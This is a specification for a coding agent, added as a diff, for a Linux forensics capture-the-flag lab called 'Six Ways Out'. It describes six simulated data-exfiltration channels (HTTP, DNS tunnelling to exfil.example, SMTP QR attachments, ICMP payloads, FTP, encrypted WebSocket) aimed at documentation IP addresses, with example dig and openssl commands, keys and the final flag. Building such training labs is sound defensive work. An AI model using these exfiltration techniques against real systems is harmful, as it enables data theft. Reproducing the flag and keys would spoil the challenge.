@@ -1,0 +1,1256 @@
+# Six Ways Out — Coding Agent Handoff Specification
+
+## 1. Project Overview
+
+This repository is for a Linux DFIR/IR CTF challenge called **"Six Ways Out"**.
+
+The challenge simulates a compromised Linux production server where an attacker already has root access. The player does **not** receive the compromised machine or any extracted files. They receive only:
+
+* Linux endpoint artifacts/logs
+* Bash history
+* Audit/process/file activity
+* Zeek/network logs
+* One real PCAP
+
+The player's objective is to investigate the incident, determine which sensitive files were accessed, identify **six different exfiltration channels**, recover the transformations/keys used for each channel, reconstruct the exfiltrated data, and combine recovered markers into the final flag.
+
+The challenge should feel like a realistic DFIR investigation rather than a collection of six isolated puzzles.
+
+All timestamps must use **UTC** consistently.
+
+---
+
+# 2. Intended Final Challenge
+
+Victim:
+
+```text
+Hostname: prod-web-03
+IP: 10.10.20.15
+```
+
+Services/capture VM:
+
+```text
+IP: 10.10.20.50
+```
+
+The challenge uses an isolated lab network.
+
+The attacker has already compromised the victim and has root access.
+
+The six exfiltration channels are:
+
+| # | Channel       | Source                                | Transformation                | Destination     |
+| - | ------------- | ------------------------------------- | ----------------------------- | --------------- |
+| 1 | HTTP          | `/opt/app/config/production.env`      | XOR + Base64                  | `198.51.100.77` |
+| 2 | DNS tunneling | `/opt/hr/employee_records.csv`        | Base32 + chunking             | `203.0.113.53`  |
+| 3 | SMTP          | QR PNGs                               | 3 QR pieces                   | `203.0.113.25`  |
+| 4 | ICMP          | `/var/backups/db.dump`                | XOR + hex + chunks            | `192.0.2.91`    |
+| 5 | FTP           | `/opt/finance/q3_forecast.xlsx`       | gzip + Base64                 | `203.0.113.88`  |
+| 6 | WebSocket     | `/srv/app/releases/release-notes.txt` | AES-256-CBC + PBKDF2 + Base64 | `203.0.113.123` |
+
+These IPs are documentation/test-network addresses. They must be made reachable inside the isolated lab using IP aliases/routing so that **actual packets** are generated and captured.
+
+---
+
+# 3. Source File Markers
+
+The source files contain these markers:
+
+```text
+/opt/app/config/production.env
+    Q7k2mLp
+
+/opt/hr/employee_records.csv
+    k91Xv2Qa
+
+/var/backups/db.dump
+    xP83LmQa
+
+/opt/finance/q3_forecast.xlsx
+    7vQm91Xe
+
+/srv/app/releases/release-notes.txt
+    Lm92Qx7P
+```
+
+SMTP consists of three QR-code images containing:
+
+```text
+IMG_1841.png -> Hnc
+IMG_1842.png -> fuEY
+IMG_1843.png -> 92kL
+```
+
+Combined SMTP value:
+
+```text
+HncfuEY92kL
+```
+
+Final intended flag:
+
+```text
+FLAG{Q7k2mLpk91Xv2Q aHncfuEY92kLxP83LmQa7vQm91XeLm92Qx7P}
+```
+
+Remove the accidental space above when implementing it:
+
+```text
+FLAG{Q7k2mLpk91Xv2QaHncfuEY92kLxP83LmQa7vQm91XeLm92Qx7P}
+```
+
+---
+
+# 4. Cryptographic / Transformation Details
+
+## HTTP
+
+Source:
+
+```text
+/opt/app/config/production.env
+```
+
+Key:
+
+```text
+mango-47
+```
+
+Process:
+
+```text
+source
+    -> XOR with mango-47
+    -> Base64
+    -> HTTP POST
+```
+
+The key should ideally NOT appear directly in bash history.
+
+The existing approach uses:
+
+```bash
+printf 'bWFuZ28tNDc=' | base64 -d
+```
+
+which gives:
+
+```text
+mango-47
+```
+
+This is intentional because players should correlate the command history with the PCAP.
+
+---
+
+## DNS
+
+Source:
+
+```text
+/opt/hr/employee_records.csv
+```
+
+Process:
+
+```text
+source
+    -> Base32
+    -> split into 30-character chunks
+    -> DNS queries
+```
+
+Queries should look like:
+
+```text
+<30-char-chunk>.exfil.example
+```
+
+Destination:
+
+```text
+203.0.113.53
+```
+
+Important:
+
+The previous prototype accidentally used Base64 for this stage.
+
+The correct implementation MUST use:
+
+```bash
+base32 -w0
+```
+
+not Base64.
+
+The DNS server should record all queries.
+
+Players should be able to reconstruct the payload by:
+
+1. Filtering DNS traffic.
+2. Identifying `exfil.example`.
+3. Ordering chunks.
+4. Concatenating labels.
+5. Base32-decoding.
+6. Recovering the source marker.
+
+---
+
+# 5. SMTP
+
+Three emails should be generated.
+
+Recipient:
+
+```text
+finance.archive@external.example
+```
+
+Subjects:
+
+```text
+Monthly reconciliation
+Updated invoice summary
+Quarterly documentation
+```
+
+Each email contains a PNG QR attachment:
+
+```text
+IMG_1841.png -> Hnc
+IMG_1842.png -> fuEY
+IMG_1843.png -> 92kL
+```
+
+The important requirement is:
+
+**The PNGs must actually exist inside the SMTP MIME stream.**
+
+Do NOT simply create QR files separately on the attacker VM.
+
+The victim must actually send the PNG attachments over SMTP so that they can be recovered from the PCAP.
+
+Players should be able to:
+
+1. Identify suspicious SMTP traffic.
+2. Reconstruct the SMTP conversation.
+3. Extract MIME attachments.
+4. Recover PNGs.
+5. Decode QR codes.
+6. Order the three pieces.
+7. Obtain:
+
+```text
+HncfuEY92kL
+```
+
+The current prototype does NOT fully implement this yet.
+
+It currently sends simple emails without actual QR attachments.
+
+This must be fixed.
+
+---
+
+# 6. ICMP
+
+Source:
+
+```text
+/var/backups/db.dump
+```
+
+Key:
+
+```text
+raven-19
+```
+
+Process:
+
+```text
+source
+    -> XOR with raven-19
+    -> hex encode
+    -> split into chunks
+    -> ICMP Echo Requests
+```
+
+Destination:
+
+```text
+192.0.2.91
+```
+
+The ICMP packets must contain the actual payload.
+
+Each packet should have a sequence/order value.
+
+The current prototype only runs normal `ping` and does NOT actually transmit the exfiltrated payload.
+
+This must be fixed.
+
+A Scapy-based sender is acceptable.
+
+Example conceptual structure:
+
+```text
+ICMP Echo Request
+    sequence = chunk number
+    payload = chunk data
+```
+
+Players should reconstruct:
+
+```text
+sort by sequence
+    -> concatenate payload
+    -> hex decode
+    -> XOR with raven-19
+    -> recover marker
+```
+
+The PCAP must contain the actual ICMP payload.
+
+---
+
+# 7. FTP
+
+Source:
+
+```text
+/opt/finance/q3_forecast.xlsx
+```
+
+Process:
+
+```text
+source
+    -> gzip
+    -> Base64
+    -> FTP upload
+```
+
+Destination:
+
+```text
+203.0.113.88
+```
+
+Credentials:
+
+```text
+username: svc_backup
+password: DailyBackup!2026
+```
+
+Remote filename:
+
+```text
+daily_metrics.dat
+```
+
+The PCAP must contain:
+
+* FTP control connection
+* USER/PASS
+* STOR command
+* FTP data connection
+* actual Base64 payload
+
+The current prototype installs `vsftpd` but does not fully configure it.
+
+Implement a realistic isolated FTP server.
+
+Use a dedicated upload-only account if practical.
+
+The victim must perform a real FTP upload.
+
+Players should reconstruct:
+
+```text
+FTP data
+    -> Base64 decode
+    -> gzip decompress
+    -> inspect XLSX
+    -> recover 7vQm91Xe
+```
+
+IMPORTANT:
+
+`q3_forecast.xlsx` should be a **real valid XLSX**, not a fake ZIP-like file.
+
+Use `openpyxl` to generate it.
+
+Place the marker somewhere realistic, e.g.:
+
+```text
+Workbook:
+    Sheet: Q3 Forecast
+    Cell: B17
+```
+
+Do not make the marker blatantly obvious in the filename.
+
+---
+
+# 8. WebSocket
+
+Source:
+
+```text
+/srv/app/releases/release-notes.txt
+```
+
+Password:
+
+```text
+Storm-Wind-2026
+```
+
+Process:
+
+```text
+source
+    -> OpenSSL AES-256-CBC
+    -> PBKDF2
+    -> random salt
+    -> Base64
+    -> WebSocket
+```
+
+Destination:
+
+```text
+203.0.113.123
+```
+
+The WebSocket traffic should be a genuine HTTP Upgrade followed by real WebSocket frames.
+
+The current prototype uses port 8080.
+
+Prefer making the final challenge use a realistic port/service configuration, but port 8080 is acceptable if changing it would create unnecessary complexity.
+
+The password should preferably not appear directly in plaintext in bash history.
+
+Use something like:
+
+```bash
+printf 'U3Rvcm0tV2luZC0yMDI2' | base64 -d > /tmp/.k6
+```
+
+Then:
+
+```bash
+openssl enc \
+    -aes-256-cbc \
+    -pbkdf2 \
+    -salt \
+    -pass file:/tmp/.k6 \
+    ...
+```
+
+This gives the player a clue without directly handing them the password.
+
+The WebSocket client must send the actual encrypted payload.
+
+Players should be able to recover it from the PCAP and decrypt it using:
+
+```text
+AES-256-CBC
+PBKDF2
+salt contained in OpenSSL ciphertext
+password = Storm-Wind-2026
+```
+
+---
+
+# 9. Network Architecture
+
+Use two VMs if possible.
+
+## Victim VM
+
+```text
+10.10.20.15
+prod-web-03
+```
+
+Runs:
+
+* auditd
+* rsyslog
+* shell
+* attacker simulation
+* all outbound traffic
+
+## Services/Capture VM
+
+```text
+10.10.20.50
+```
+
+Runs:
+
+* HTTP receiver
+* DNS receiver
+* SMTP server
+* FTP server
+* WebSocket receiver
+* tcpdump
+* Zeek
+
+The six logical destination IPs should be configured as IP aliases on the services VM:
+
+```text
+198.51.100.77
+203.0.113.53
+203.0.113.25
+192.0.2.91
+203.0.113.88
+203.0.113.123
+```
+
+They should all terminate on the services VM.
+
+The goal is for the PCAP to show the logical destination IPs exactly as specified.
+
+---
+
+# 10. Current Repository State
+
+The current prototype contains:
+
+```text
+README.md
+config.env
+config.env.example
+
+setup/
+    install_dependencies.sh
+    setup_victim.sh
+    setup_attacker.sh
+
+victim/
+    benign_activity.sh
+    attacker_simulation.sh
+
+attacker/
+    http_server.py
+    dns_server.py
+    generate_qr.py
+    websocket_server.py
+    websocket_client.py
+    start_services.sh
+
+capture/
+    start_capture.sh
+    stop_capture.sh
+
+collection/
+    collect_endpoint.sh
+    collect_zeek.sh
+    build_challenge.sh
+
+verify/
+    verify_payloads.py
+    verify_timeline.py
+
+FILE_LIST.txt
+```
+
+A ZIP was previously generated:
+
+```text
+six_ways_out_reproducible_lab.zip
+```
+
+This prototype is **not yet a complete end-to-end implementation**.
+
+Do not assume that because a script exists, the functionality is fully wired.
+
+---
+
+# 11. Known Prototype Problems
+
+Fix these before considering the project complete.
+
+### Problem 1 — SMTP
+
+Current implementation does not send actual QR PNG attachments.
+
+Required:
+
+```text
+actual PNG
+    -> MIME attachment
+    -> SMTP
+    -> PCAP
+    -> player extracts PNG
+```
+
+---
+
+### Problem 2 — ICMP
+
+Current implementation only executes normal ping.
+
+Required:
+
+```text
+actual encoded payload
+    -> ICMP packets
+    -> PCAP
+```
+
+---
+
+### Problem 3 — FTP
+
+Current implementation does not completely configure the FTP server.
+
+Required:
+
+```text
+victim FTP client
+    -> actual FTP server
+    -> real upload
+    -> PCAP
+```
+
+---
+
+### Problem 4 — Logical IP routing
+
+The RFC documentation IPs will not automatically reach the services VM.
+
+Configure IP aliases/routing so:
+
+```text
+198.51.100.77
+203.0.113.53
+203.0.113.25
+192.0.2.91
+203.0.113.88
+203.0.113.123
+```
+
+are locally reachable on the isolated lab.
+
+---
+
+### Problem 5 — DNS resolver
+
+The victim currently relies too much on the system resolver.
+
+Make DNS exfiltration explicit and reliable.
+
+For example:
+
+```bash
+dig +short "${chunk}.exfil.example" @203.0.113.53
+```
+
+The resulting PCAP must contain actual DNS queries.
+
+---
+
+### Problem 6 — XLSX
+
+Generate a genuine XLSX.
+
+Use:
+
+```text
+openpyxl
+```
+
+The final file should open normally in LibreOffice/Excel.
+
+---
+
+### Problem 7 — Verification
+
+`verify_payloads.py` currently checks mostly that artifacts exist.
+
+It must become a real validation tool.
+
+It should actually verify:
+
+```text
+HTTP payload -> decrypt -> expected marker
+DNS payload -> reconstruct -> expected marker
+SMTP -> extract PNGs -> QR decode -> expected pieces
+ICMP -> reconstruct -> decrypt -> expected marker
+FTP -> decode -> decompress -> expected marker
+WebSocket -> reconstruct -> decrypt -> expected marker
+```
+
+If any channel fails, verification should fail.
+
+---
+
+# 12. Endpoint Evidence Requirements
+
+The challenge should produce realistic endpoint evidence.
+
+Collect at least:
+
+```text
+/root/.bash_history
+/var/log/auth.log
+/var/log/syslog
+/var/log/audit/audit.log
+```
+
+Also produce structured process/file activity where practical.
+
+Audit rules should cover:
+
+```text
+execve
+/opt/app/config/production.env
+/opt/hr/employee_records.csv
+/var/backups/db.dump
+/opt/finance/q3_forecast.xlsx
+/srv/app/releases/release-notes.txt
+/tmp
+```
+
+The purpose is to allow players to answer:
+
+```text
+What was accessed?
+When was it accessed?
+What process accessed it?
+Was it staged?
+Was it actually exfiltrated?
+Through which protocol?
+```
+
+---
+
+# 13. Important DFIR Design Principle
+
+Do NOT make:
+
+```text
+accessed file = exfiltrated file
+```
+
+There should be some legitimate access and some suspicious staging.
+
+For example, include:
+
+```text
+sensitive file accessed but not exfiltrated
+temporary staging file created and deleted
+normal administrative commands
+normal curl/dig/ping/gzip/base64/openssl activity
+```
+
+This forces the player to correlate endpoint evidence with network evidence.
+
+---
+
+# 14. Benign Noise
+
+The challenge should contain realistic benign use of the same tools involved in the attack.
+
+For example:
+
+```text
+curl
+dig
+ping
+gzip
+base64
+openssl
+sha256sum
+find
+ss
+df
+free
+ftp
+```
+
+Do not make every invocation malicious.
+
+The goal is to prevent:
+
+```bash
+grep curl
+grep base64
+grep openssl
+```
+
+from immediately solving the challenge.
+
+However, do NOT create massive artificial noise just to inflate difficulty.
+
+The challenge should be hard because of:
+
+```text
+cross-source correlation
+timeline analysis
+encoding recognition
+protocol analysis
+artifact reconstruction
+```
+
+not because of millions of useless log lines.
+
+---
+
+# 15. Bash History
+
+The attacker history should contain a mixture of:
+
+### Benign commands
+
+Examples:
+
+```bash
+cd /var/log
+ls -lah
+df -h
+free -m
+ss -lntup
+find /var/log -type f -mtime -1
+curl -s http://127.0.0.1/health
+dig localhost
+```
+
+### Suspicious commands
+
+Commands related to:
+
+```text
+file discovery
+staging
+encoding
+encryption
+network transfer
+cleanup
+```
+
+Do not explicitly write:
+
+```text
+EXFILTRATE /opt/foo
+```
+
+The history should look like an actual shell session.
+
+---
+
+# 16. Keys Should Be Discoverable, Not Handed Over
+
+Avoid this:
+
+```bash
+openssl ... -pass pass:Storm-Wind-2026
+```
+
+because it gives away the password immediately.
+
+Prefer:
+
+```bash
+printf 'U3Rvcm0tV2luZC0yMDI2' | base64 -d > /tmp/.k6
+```
+
+and:
+
+```bash
+openssl ... -pass file:/tmp/.k6
+```
+
+Likewise:
+
+```text
+mango-47
+raven-19
+```
+
+should preferably be recovered through commands/artifacts rather than appearing plainly in the command history.
+
+The challenge should provide enough evidence that a skilled analyst can solve it without guessing.
+
+---
+
+# 17. Challenge Difficulty
+
+Target difficulty:
+
+```text
+Hard
+```
+
+but suitable for a:
+
+```text
+24-hour CTF
+```
+
+It should be realistic and technically deep.
+
+Do NOT make it difficult by:
+
+* huge irrelevant logs
+* arbitrary random encoding layers
+* obscure undocumented tricks
+* unnecessary reversing
+* impossible timestamps
+* fake protocol data
+
+Difficulty should come from:
+
+```text
+timeline reconstruction
++
+endpoint/network correlation
++
+six protocols
++
+different encoding schemes
++
+key discovery
++
+payload reconstruction
+```
+
+---
+
+# 18. AI-Resistance
+
+The challenge should not be trivially solved by uploading one artifact to an LLM.
+
+There should be enough distributed evidence that the player needs to correlate:
+
+```text
+bash history
++
+audit logs
++
+network logs
++
+PCAP
+```
+
+For example:
+
+```text
+bash history:
+    base32 + fold -w 30
+
+PCAP:
+    suspicious DNS labels
+
+DNS log:
+    exact queries
+
+```
+
+The analyst must combine them.
+
+Similarly:
+
+```text
+history:
+    openssl AES command
+
+PCAP:
+    WebSocket binary frames
+
+audit:
+    temporary key file
+
+```
+
+The password/algorithm should be recoverable through correlation.
+
+---
+
+# 19. Final Player Package
+
+The final player ZIP should contain only investigation artifacts.
+
+Suggested structure:
+
+```text
+six_ways_out_player/
+│
+├── CHALLENGE.md
+│
+├── endpoint/
+│   ├── audit.log
+│   ├── auth.log
+│   ├── syslog.log
+│   ├── bash_history.txt
+│   ├── process_events.jsonl
+│   └── file_events.jsonl
+│
+└── network/
+    ├── conn.log
+    ├── dns.log
+    ├── http.log
+    ├── ftp.log
+    ├── smtp.log
+    ├── files.log
+    └── exfiltration.pcap
+```
+
+DO NOT include:
+
+```text
+source files
+keys
+QR PNG originals
+decoded payloads
+attacker scripts
+organizer answers
+```
+
+The PCAP itself must contain enough information for players to recover the QR images and transferred data.
+
+---
+
+# 20. Organizer Package
+
+Create a separate organizer package containing:
+
+```text
+WRITEUP.md
+ANSWERS.md
+timeline.csv
+verification.txt
+recovered_payloads/
+```
+
+The organizer writeup should document:
+
+```text
+initial compromise assumption
+timeline
+file access
+staging
+HTTP exfil
+DNS exfil
+SMTP exfil
+ICMP exfil
+FTP exfil
+WebSocket exfil
+keys
+transformations
+recovered values
+final flag
+```
+
+---
+
+# 21. Required Automation
+
+Ideally the entire lab should be reproducible with something close to:
+
+```bash
+./setup/install_dependencies.sh victim
+./setup/setup_victim.sh
+```
+
+on the victim, and:
+
+```bash
+./setup/install_dependencies.sh attacker
+./setup/setup_attacker.sh
+./attacker/start_services.sh
+./capture/start_capture.sh
+```
+
+on the services VM.
+
+Then:
+
+```bash
+sudo ./victim/attacker_simulation.sh
+```
+
+runs the attack.
+
+Afterward:
+
+```bash
+./capture/stop_capture.sh
+./collection/collect_endpoint.sh
+./collection/collect_zeek.sh
+./verify/verify_payloads.py
+./verify/verify_timeline.py
+./collection/build_challenge.sh
+```
+
+should generate:
+
+```text
+output/six_ways_out_player.zip
+output/six_ways_out_full.zip
+```
+
+The final goal is to make this as close to a **one-command reproducible challenge generator** as practical.
+
+---
+
+# 22. Reset Capability
+
+Add a reset script if practical:
+
+```text
+reset_lab.sh
+```
+
+It should remove:
+
+```text
+/tmp attack artifacts
+runtime/
+PCAP
+generated logs
+received payloads
+temporary QR files
+temporary keys
+```
+
+without destroying the base challenge source files.
+
+This allows repeated testing.
+
+---
+
+# 23. Testing Requirements
+
+Before declaring the challenge complete, run the attack from a clean VM.
+
+Verify:
+
+### HTTP
+
+Actual HTTP packet exists:
+
+```text
+10.10.20.15 -> 198.51.100.77
+```
+
+and payload reconstructs correctly.
+
+### DNS
+
+Actual DNS packets:
+
+```text
+10.10.20.15 -> 203.0.113.53
+```
+
+and Base32 reconstruction works.
+
+### SMTP
+
+Actual SMTP conversation:
+
+```text
+10.10.20.15 -> 203.0.113.25
+```
+
+with three real PNG MIME attachments.
+
+QR decoding must work directly from the PCAP-extracted images.
+
+### ICMP
+
+Actual:
+
+```text
+10.10.20.15 -> 192.0.2.91
+```
+
+ICMP Echo Requests containing payload chunks.
+
+### FTP
+
+Actual:
+
+```text
+10.10.20.15 -> 203.0.113.88
+```
+
+FTP login and file upload.
+
+### WebSocket
+
+Actual:
+
+```text
+10.10.20.15 -> 203.0.113.123
+```
+
+HTTP Upgrade followed by WebSocket frames.
+
+---
+
+# 24. Final Verification
+
+The most important requirement is:
+
+**Do not trust the intended flag. Reconstruct it from the generated PCAP and artifacts.**
+
+The verification script should independently recover:
+
+```text
+HTTP      = Q7k2mLp
+DNS       = k91Xv2Qa
+SMTP      = HncfuEY92kL
+ICMP      = xP83LmQa
+FTP       = 7vQm91Xe
+WebSocket = Lm92Qx7P
+```
+
+and then construct:
+
+```text
+FLAG{Q7k2mLpk91Xv2QaHncfuEY92kLxP83LmQa7vQm91XeLm92Qx7P}
+```
+
+If the PCAP cannot independently produce those values, the implementation is not complete.
+
+---
+
+# 25. Coding-Agent Priority
+
+Work in this order:
+
+1. Inspect the existing repository and understand what is already implemented.
+2. Fix network/IP routing so every logical destination is reachable.
+3. Implement real HTTP exfil.
+4. Implement real DNS exfil.
+5. Implement real SMTP with QR MIME attachments.
+6. Implement real ICMP payload exfil.
+7. Implement real FTP server/upload.
+8. Implement real WebSocket traffic.
+9. Make endpoint logging realistic.
+10. Add benign activity/noise.
+11. Make timestamps consistent in UTC.
+12. Implement actual PCAP reconstruction verification.
+13. Generate a real XLSX.
+14. Test the complete attack from a clean environment.
+15. Generate the player and organizer ZIPs.
+16. Re-run the verification from the generated artifacts, not from the original source data.
+
+Do not simply patch around failures with synthetic packets.
+
+The central requirement is:
+
+> **The PCAP must contain genuine network traffic generated by the simulation, and the final flag must be independently recoverable from those artifacts.**
+
+If something cannot be implemented realistically, prefer changing the lab architecture rather than fabricating the corresponding evidence.
